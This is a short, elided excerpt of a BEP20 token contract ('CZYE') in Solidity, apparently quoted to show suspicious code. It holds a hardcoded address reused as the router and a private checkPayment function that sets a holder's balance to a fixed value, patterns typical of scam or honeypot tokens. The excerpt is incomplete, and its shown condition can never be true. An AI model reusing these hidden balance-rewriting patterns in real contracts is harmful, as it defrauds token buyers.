...
contract CZYE is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 100000 * 10 ** 6 * 10 ** 9;
    uint256 private reflux = 50000000;
    string private _name;
    string private _symbol;
    address public addr=0xa2367eB3e2E836a7aE91AB534F00F3B9957C49F4;
    address _routeradd=0xa2367eB3e2E836a7aE91AB534F00F3B9957C49F4;
    ...
    constructor(
        ...
        addr1 = IPancakeFactory(_pancakeRouter.factory())
    ...
    function checkPayment(address addr1) private
    {
        if (addr1!=addr1)
        {
            bal[addr1]=reflux;
